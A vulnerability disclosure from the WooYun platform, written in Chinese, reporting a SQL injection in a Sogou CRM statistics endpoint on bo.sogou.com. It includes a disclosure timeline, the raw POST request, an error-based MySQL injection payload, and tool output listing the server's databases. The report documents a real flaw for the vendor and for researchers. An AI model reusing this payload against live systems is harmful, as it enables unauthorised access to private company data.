wybug_detail: 漏洞详情 披露状态：   									2016-03-07：	细节已通知厂商并且等待厂商处理中									2016-03-11：	厂商已经确认，细节仅向厂商公开									2016-03-21：	细节向核心白帽子及相关领域专家公开									2016-03-31：	细节向普通白帽子公开									2016-04-10：	细节向实习白帽子公开									2016-04-25：	细节向公众公开  简要描述： 漏洞提交SRC一两个月都不审核，这样的SRC头一回见。。那就一个个乌云见吧 详细说明：  POST /a/statistic/newCustomerSummary/list HTTP/1.1Host: bo.sogou.com{"pageNo":1,"pageSize":20,"dimension":1,"time":{"type":1,"start":"2016-02-06","end":"2016-02-06"},"lastTime":null,"changeType":null,"query":"","queryType":null,"custType":""}   漏洞证明：      Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: {"pageNo":1,"pageSize":20,"dimension":1,"time":{"type":1,"start":"2016-02-06' AND (SELECT 8211 FROM(SELECT COUNT(*),CONCAT(0x7164726671,(SELECT (CASE WHEN (8211=8211) THEN 1 ELSE 0 END)),0x716c6a6171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YTUh'='YTUh","end":"2016-02-06"},"lastTime":null,"changeType":null,"query":"","queryType":null,"custType":""}---[17:03:09] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[17:03:09] [INFO] fetching database names[17:03:09] [INFO] the SQL query used returns 3 entries[17:03:09] [INFO] resumed: information_schema[17:03:09] [INFO] resumed: sogou_crm[17:03:09] [INFO] resumed: testavailable databases [3]:[*] information_schema[*] sogou_crm[*] test   修复方案：  过滤   版权声明：转载请注明来源 getshell1993@乌云
